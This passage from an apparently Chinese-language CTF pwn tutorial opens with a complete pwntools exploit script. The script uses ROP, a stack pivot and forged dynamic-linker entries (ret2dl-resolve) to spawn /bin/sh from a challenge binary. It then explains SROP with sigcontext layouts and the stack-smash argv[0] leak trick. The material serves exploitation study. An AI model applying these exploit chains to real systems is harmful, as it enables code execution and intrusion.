class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;/bin/tmux&quot;,&quot;sp&quot;,&quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,49160 )</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.31.so&#x27;)</span></span><br><span class="line">io = process(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezzzz&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">rl = <span class="keyword">lambda</span>a=<span class="literal">False</span>: io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>: io.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: io.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(io, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s: log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data: u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data: u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">ur64 = <span class="keyword">lambda</span> data: u64(data.rjust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class="line">    <span class="comment"># pop rbx, rbp, r12, r13, r14, r15</span></span><br><span class="line">    <span class="comment"># rbx = 0</span></span><br><span class="line">    <span class="comment"># rbp = 1, enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function that you want to call</span></span><br><span class="line">    <span class="comment"># rdi = edi = r13d</span></span><br><span class="line">    <span class="comment"># rsi = r14</span></span><br><span class="line">    <span class="comment"># rdx = r15</span></span><br><span class="line">    payload = p64(csu_end_addr)</span><br><span class="line">    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r15) + p64(r14) + p64(r13) </span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">csu_front_addr = <span class="number">0x4007c0</span></span><br><span class="line">csu_end_addr = <span class="number">0x4007da</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007e3</span></span><br><span class="line">leave_ret = <span class="number">0x4005A3</span></span><br><span class="line">readgot = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">addr_dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">addr_dynamic = elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">addr_dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">addr_dyrelplt = elf.get_section_by_name(<span class="string">&#x27;.rela.dyn&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;addr_dyrelplt&#x27;</span>,<span class="built_in">hex</span>(addr_dyrelplt)</span><br><span class="line">addr_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">addr_dt_debug = addr_dynamic + <span class="number">0x10</span>*<span class="number">12</span></span><br><span class="line">addr_dt_pltgot = addr_dynamic + <span class="number">0x10</span>*<span class="number">13</span></span><br><span class="line">addr_dt_rela = addr_dynamic + <span class="number">0x10</span>*<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># useful gadgets</span></span><br><span class="line">findaddr = <span class="number">0x400606</span></span><br><span class="line">findaddrplt = bss_addr+<span class="number">0x40</span></span><br><span class="line">editaddr = <span class="number">0x000000000040067c</span></span><br><span class="line">editaddrplt = bss_addr+<span class="number">0x48</span></span><br><span class="line">resolver = bss_addr+<span class="number">0x10</span></span><br><span class="line">linkmap = bss_addr+<span class="number">18</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x400</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">size_bulkread = <span class="number">0x400</span></span><br><span class="line">offset = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;./ezzzz&quot;</span>)</span><br><span class="line">rop.raw(offset*<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, readgot, <span class="number">0</span>, base_stage, <span class="number">0x950</span>))</span><br><span class="line"><span class="comment"># stack pivot</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">io.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">linkmap: dt_debug(8) -&gt; r_debug(8) -&gt; r_map -&gt; linkmap</span></span><br><span class="line"><span class="string">resolver: linkmap-&gt;l_next(0x18) -&gt; l_next(0x18) -&gt; l_info[DT_PLTGOT](0x58) -&gt;d_un.d_ptr(got(0x8)) -&gt; resolver(0x10)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./ezzzz&quot;</span>)</span><br><span class="line">addr_esp = base_stage + <span class="number">8</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, readgot, <span class="number">0</span>, bss_addr+<span class="number">0x20</span>, <span class="number">0x38</span>)) <span class="comment"># write dt_debug findaddr editaddr to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>,findaddrplt, <span class="number">0</span>, <span class="number">1</span>,<span class="number">0</span>)) <span class="comment"># write r_debug to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>,findaddrplt, <span class="number">8</span>, <span class="number">1</span>,<span class="number">0x8b0</span>/<span class="number">8</span>)) <span class="comment"># write r_map to bss (0x6018d8)</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x18</span>, <span class="number">0</span>,<span class="number">0</span>)) <span class="comment"># write linkmap-&gt;l_next to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x18</span>, <span class="number">0</span>,<span class="number">0</span>)) <span class="comment"># write linkmap-&gt;l_next-&gt;l_next to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x58</span>, <span class="number">0</span>,<span class="number">0</span>)) <span class="comment"># write linkmap-&gt;l_next-&gt;l_info[DT_PLTGOT] to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x8</span>, <span class="number">0</span>,<span class="number">0</span>)) <span class="comment"># write linkmap-&gt;l_next-&gt;l_info[DT_PLTGOT]-&gt;d_un.d_ptr to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, findaddrplt, <span class="number">0x10</span>, <span class="number">0</span>,<span class="number">0x8b0</span>/<span class="number">8</span>)) <span class="comment"># write linkmap-&gt;l_next-&gt;l_info[DT_PLTGOT]-&gt;d_un.d_ptr-&gt;resolver to bss</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, editaddrplt, <span class="number">0x8b0</span>/<span class="number">8</span>, <span class="number">0x1d0</span>/<span class="number">8</span>,<span class="number">0</span>)) <span class="comment"># write dt_versym</span></span><br><span class="line">rop.raw(csu(<span class="number">0</span>, <span class="number">1</span>, editaddrplt, <span class="number">0x8b0</span>/<span class="number">8</span>,<span class="number">0xf8</span>/<span class="number">8</span>,addr_dt_rela)) <span class="comment"># recover dt_JMPREL to rela.dyn bypass l_info[DT_JMPREL]=0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># compute offset</span></span><br><span class="line">addr_esp += <span class="number">0x78</span>*<span class="number">10</span>+<span class="number">0x20</span></span><br><span class="line">fake_reloc = addr_esp + <span class="number">8</span></span><br><span class="line">align_reloc = <span class="number">0x18</span>-((fake_reloc-addr_dyrelplt)%<span class="number">0x18</span>)</span><br><span class="line">fake_reloc += align_reloc</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fake_reloc&#x27;</span>,<span class="built_in">hex</span>(fake_reloc)</span><br><span class="line"></span><br><span class="line">fakedynsym = fake_reloc + <span class="number">24</span></span><br><span class="line">align_dynsym = <span class="number">0x18</span>-((fakedynsym-addr_dynsym)%<span class="number">0x18</span>)</span><br><span class="line">fakedynsym += align_dynsym</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fakedynsym&#x27;</span>,<span class="built_in">hex</span>(fakedynsym)</span><br><span class="line"></span><br><span class="line">fakedynstr = fakedynsym + <span class="number">48</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;fakedynstr&#x27;</span>,<span class="built_in">hex</span>(fakedynstr)</span><br><span class="line">cmdstr = fakedynstr+<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;cmdstr&#x27;</span>,<span class="built_in">hex</span>(cmdstr)</span><br><span class="line"></span><br><span class="line">reloc_offset = (fake_reloc-addr_dyrelplt)/<span class="number">0x18</span></span><br><span class="line">r_info = (((fakedynsym-addr_dynsym)/<span class="number">0x18</span>)&lt;&lt;<span class="number">32</span>)|<span class="number">7</span></span><br><span class="line">st_name = fakedynstr - addr_dynstr</span><br><span class="line"></span><br><span class="line">rop.raw([pop_rdi_ret,cmdstr])</span><br><span class="line">rop.raw(<span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># dl_resolve</span></span><br><span class="line">rop.raw(<span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># linkmap</span></span><br><span class="line">rop.raw(reloc_offset) </span><br><span class="line">rop.raw(<span class="string">&#x27;AAAAAAAA&#x27;</span>) </span><br><span class="line">rop.raw(<span class="string">&#x27;A&#x27;</span>*align_reloc) </span><br><span class="line">rop.raw([bss_addr,r_info,<span class="number">0</span>]) <span class="comment"># keep fake reloc writeable </span></span><br><span class="line">rop.raw(<span class="string">&#x27;A&#x27;</span>*align_dynsym)</span><br><span class="line">rop.raw([st_name,<span class="number">0x12</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]) </span><br><span class="line">rop.raw(<span class="string">&#x27;system\x00\x00&#x27;</span>)</span><br><span class="line">rop.raw(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># print rop.dump()</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">pause()</span><br><span class="line">sl(rop.chain())</span><br><span class="line">pause()</span><br><span class="line">sl(p64(<span class="number">0xbeefdead</span>)+p64(<span class="number">0</span>)+p64(addr_dt_debug+<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(findaddr)+p64(editaddr))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在partial|full relro时,更多时候目标就是依次伪造reloc表项,dynsym表项,dynstr表项,布置好参数,然后截取调用dlresolve(e.g.plt公共表项,ret直接调用等)</p><p>no relro时则方法要更多,但一般采用最方便的修改<code>.dynamic</code>中的索引指针</p><h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png" alt=""></p><ol><li><p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p></li><li><p>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/signal2-stack.png" alt=""></p><p>从图中可以看出,<strong>执行完sigreturn,当前rsp指向的就是sigframe</strong></p><p>对于 signal Frame 来说，会因为架构的不同而有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext</p><ul><li>x86</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>x64</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="type">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="type">__uint16_t</span>        swd;</span><br><span class="line">  <span class="type">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="type">__uint16_t</span>        fop;</span><br><span class="line">  <span class="type">__uint64_t</span>        rip;</span><br><span class="line">  <span class="type">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="type">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="type">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">__uint64_t</span> r8;</span><br><span class="line">  <span class="type">__uint64_t</span> r9;</span><br><span class="line">  <span class="type">__uint64_t</span> r10;</span><br><span class="line">  <span class="type">__uint64_t</span> r11;</span><br><span class="line">  <span class="type">__uint64_t</span> r12;</span><br><span class="line">  <span class="type">__uint64_t</span> r13;</span><br><span class="line">  <span class="type">__uint64_t</span> r14;</span><br><span class="line">  <span class="type">__uint64_t</span> r15;</span><br><span class="line">  <span class="type">__uint64_t</span> rdi;</span><br><span class="line">  <span class="type">__uint64_t</span> rsi;</span><br><span class="line">  <span class="type">__uint64_t</span> rbp;</span><br><span class="line">  <span class="type">__uint64_t</span> rbx;</span><br><span class="line">  <span class="type">__uint64_t</span> rdx;</span><br><span class="line">  <span class="type">__uint64_t</span> rax;</span><br><span class="line">  <span class="type">__uint64_t</span> rcx;</span><br><span class="line">  <span class="type">__uint64_t</span> rsp;</span><br><span class="line">  <span class="type">__uint64_t</span> rip;</span><br><span class="line">  <span class="type">__uint64_t</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> __pad0;</span><br><span class="line">  <span class="type">__uint64_t</span> err;</span><br><span class="line">  <span class="type">__uint64_t</span> trapno;</span><br><span class="line">  <span class="type">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="type">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="type">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="type">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p></li></ol><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p><ul><li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li></ul><p>说到这里，其实，SROP 的基本利用原理也就出现了。下面举两个简单的例子。</p><h3 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h3><p>首先，假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-1.png" alt=""></p><p>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell</p><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。只需要做两处修改即可</p><ul><li><strong>控制栈指针。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li></ul><p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-2.png" alt=""></p><h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p><ul><li><strong>可以通过栈溢出来控制栈的内容</strong></li><li>需要知道相应的地址<ul><li><strong>“/bin/sh”</strong></li><li><strong>Signal Frame</strong></li><li><strong>syscall</strong></li><li><strong>sigreturn</strong></li></ul></li><li>需要有够大的空间来塞下整个 sigal frame</li></ul><p>此外，关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-gadget-1.png" alt=""></p><p>并且有些系统上 SROP 的地址被随机化了，而有些则没有。比如说<code>Linux &lt; 3.3 x86_64</code>（在 Debian 7.0， Ubuntu Long Term Support， CentOS 6 系统中默认内核），可以直接在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段。如下</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-gadget-2.png" alt="gadget1"></p><p>但是目前它已经被<code>vsyscall-emulate</code>和<code>vdso</code>机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。</p><p>值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。</p><h1 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack smash"></a>stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，一般来说并不会关心报错信息。</p><p>而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串</p><p>argv[0]即函数名指针，正常情况下，这个指针指向了程序名。其代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) __stack_chk_fail (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">&quot;stack smashing detected&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __attribute__ ((<span class="keyword">noreturn</span>)) internal_function __fortify_fail (<span class="type">const</span> <span class="type">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">&quot;*** %s ***: %s terminated\n&quot;</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">&quot;&lt;unknown&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。</p><blockquote><p>批注： 这个方法在 glibc-2.31 之后不可用了, 具体看这个部分代码 <a href="https://elixir.bootlin.com/glibc/glibc-2.31/source/debug/fortify_fail.c">fortify_fail.c</a> 。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (do_abort, &quot;*** %s ***: terminated\n&quot;, msg);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def 